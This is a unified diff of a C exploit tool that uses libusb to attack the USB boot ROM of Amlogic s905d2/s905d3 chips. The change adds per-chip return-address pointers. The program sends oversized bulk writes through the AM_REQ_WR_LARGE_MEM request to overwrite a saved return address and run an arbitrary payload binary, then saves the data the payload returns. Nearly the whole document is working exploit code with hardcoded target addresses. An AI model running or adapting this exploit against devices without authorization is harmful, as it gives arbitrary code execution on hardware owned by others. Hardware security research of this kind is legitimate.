@@ -12,6 +12,7 @@
 #define DEBUG 1
 #define VENDOR_ID 0x1b8e
 #define PRODUCT_ID 0xc003
+#define AM_REQ_WR_LARGE_MEM 0x11
 
 #if DEBUG
 #define dprint(args...) printf(args)
@@ -19,32 +20,37 @@
 #define dprint(args...)
 #endif
 
-#define AM_REQ_WR_LARGE_MEM 0x11
+static char *target_names[] = {
+	"s905d3",
+	"s905d2"
+};
+
+static uint32_t target_ra_ptrs[] = {
+	0xfffe3688,//s905d3
+	0xfffe3678 //s905d2
+};
 
 #define LOAD_ADDR 0xfffa0000
 #define RUN_ADDR  LOAD_ADDR
-#define TARGET_RA_PTR 0xfffe3688
 #define BULK_TRANSFER_SIZE 0x100					  //alternative : 0x200, 0x1000
 #define MAX_PAYLOAD_SIZE 0x10000 - BULK_TRANSFER_SIZE // we need the last transfer to overwrite return address
-#define BULK_TRANSFER_COUNT ((TARGET_RA_PTR - LOAD_ADDR) / BULK_TRANSFER_SIZE)
-#define RAM_SIZE ((TARGET_RA_PTR - (LOAD_ADDR + (BULK_TRANSFER_COUNT * BULK_TRANSFER_SIZE))) / 4) + 1
 
 libusb_device_handle *handle = NULL;
 
 typedef struct __attribute__((__packed__)) dldata_s
 {
-	u_int32_t addr;
-	u_int32_t size;
-	u_int32_t unk0;
-	u_int32_t unk1;
-	u_int8_t data[];
+	uint32_t addr;
+	uint32_t size;
+	uint32_t unk0;
+	uint32_t unk1;
+	uint8_t data[];
 } dldata_t;
 
 static int save_received_data(const char *filename){
 	FILE *fd;
 	int transferred = 0;
 	int total_transferred = 0;
-	uint8_t buf[0x200];//todo
+	uint8_t buf[0x200];
 
 	fd = fopen(filename,"wb");
 	if (fd == NULL) {
@@ -56,23 +62,25 @@ static int save_received_data(const char *filename){
 		libusb_bulk_transfer(handle, LIBUSB_ENDPOINT_IN | 1, buf, sizeof(buf), &transferred, 10);// no error handling because device-side is a mess anyway
 		fwrite(buf, 1, transferred, fd);
 		total_transferred += transferred;
-	} while(transferred);
+	} while(transferred || (total_transferred == 0));
 
 	fclose(fd);
 
 	return total_transferred;
 }
 
-static int exploit(dldata_t *payload)
+static int exploit(uint32_t ra_ptr, dldata_t *payload)
 {
 	int rc, transferred, i = 0;
 	uint8_t bmRequestType, bRequest = 0;
 	uint16_t wValue, wIndex, wLength = 0;
-	u_int32_t ram[RAM_SIZE] = {0};
+	uint32_t bulk_transfer_cnt = (ra_ptr - LOAD_ADDR) / BULK_TRANSFER_SIZE;
+	uint32_t ram_size = ((ra_ptr - (LOAD_ADDR + (bulk_transfer_cnt * BULK_TRANSFER_SIZE))) / 4) + 1;
+	uint32_t *ram = calloc(ram_size, sizeof(uint32_t));
 	bmRequestType = 0x40;
 	bRequest = AM_REQ_WR_LARGE_MEM;
 	wValue = BULK_TRANSFER_SIZE;
-	wIndex = BULK_TRANSFER_COUNT + 1; //one extra transfer to overwrite return address
+	wIndex = bulk_transfer_cnt + 1; //one extra transfer to overwrite return address
 	wLength = sizeof(dldata_t);
 
 	payload->size += BULK_TRANSFER_SIZE; //extra transfer to overwrite return address...
@@ -120,10 +128,11 @@ static int exploit(dldata_t *payload)
 	}
 
 	//overwrite return address with payload address
-	ram[RAM_SIZE - 1] = RUN_ADDR;
+	ram[ram_size - 1] = RUN_ADDR;
 
 	printf("- exploit: sending last transfer to overwrite RAM...\n");
-	rc = libusb_bulk_transfer(handle, LIBUSB_ENDPOINT_OUT | 2, (uint8_t *)ram, sizeof(ram), &transferred, 0);
+	rc = libusb_bulk_transfer(handle, LIBUSB_ENDPOINT_OUT | 2, (uint8_t *)ram, (ram_size * sizeof(uint32_t)), &transferred, 0);
+	free(ram);
 	if (rc)
 	{
 		printf("libusb_bulk_transfer LIBUSB_ENDPOINT_OUT: error %d\n", rc);
@@ -143,20 +152,38 @@ int main(int argc, char *argv[])
 	dldata_t *payload;
 	uint8_t identity[6];
 	size_t payload_size, fd_size;
-	int rc;
+	uint32_t target_ra_ptr = 0;
+	int rc, i;
 
-	if (!(argc == 2 || argc == 3))
+	if (!(argc == 3 || argc == 4))
 	{
-		printf("Usage: %s <input_file> [<output_file>]\n", argv[0]);
+		printf("Usage: %s <target_name> <input_file> [<output_file>]\n", argv[0]);
+		printf("\ttarget_name: ");
+		for(i = 0; i < sizeof(target_names)/sizeof(target_names[0]); i++)
+			printf("%s ", target_names[i]);
+		printf("\n");
 		printf("\tinput_file: payload binary to load and execute (max size %u bytes)\n", MAX_PAYLOAD_SIZE);
 		printf("\toutput_file: file to write data returned by payload\n");
 		return EXIT_SUCCESS;
 	}
 
-	fd = fopen(argv[1], "rb");
+	for(i = 0; i < sizeof(target_names)/sizeof(target_names[0]); i++){
+		if(!strcmp(target_names[i], (char *)argv[1])){
+			printf("Target: %s\n", target_names[i]);
+			target_ra_ptr = target_ra_ptrs[i];
+		}
+	}
+
+	if (!target_ra_ptr)
+	{
+		fprintf(stderr, "Invalid target %s !\n", argv[1]);
+		return EXIT_FAILURE;
+	}
+
+	fd = fopen(argv[2], "rb");
 	if (fd == NULL)
 	{
-		fprintf(stderr, "Can't open input file %s !\n", argv[1]);
+		fprintf(stderr, "Can't open input file %s !\n", argv[2]);
 		return EXIT_FAILURE;
 	}
 
@@ -217,13 +244,13 @@ int main(int argc, char *argv[])
 	}
 	else
 	{
-		exploit(payload);
+		exploit(target_ra_ptr, payload);
 	}
 
-	if(argc == 3){
-		rc = save_received_data(argv[2]);
+	if(argc == 4){
+		rc = save_received_data(argv[3]);
 		if(rc > 0){
-			printf("Received data saved to file %s (%u bytes).\n", argv[2], rc);
+			printf("Received data saved to file %s (%u bytes).\n", argv[3], rc);
 		}
 	}
 
